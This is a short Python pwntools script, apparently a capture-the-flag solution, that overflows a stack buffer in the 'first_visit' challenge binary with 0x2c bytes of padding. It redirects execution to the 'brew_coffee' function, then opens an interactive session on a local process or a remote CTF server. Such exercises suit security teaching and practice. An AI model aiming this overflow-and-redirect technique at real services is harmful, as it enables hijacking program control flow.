#!/usr/bin/env python3

from pwn import *

exe = ELF("./first_visit", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("chals1.apoorvctf.xyz", 3001)

# input()

payload = b'a'*0x2c + p32(exe.sym['brew_coffee'])
p.sendline(payload)

p.interactive()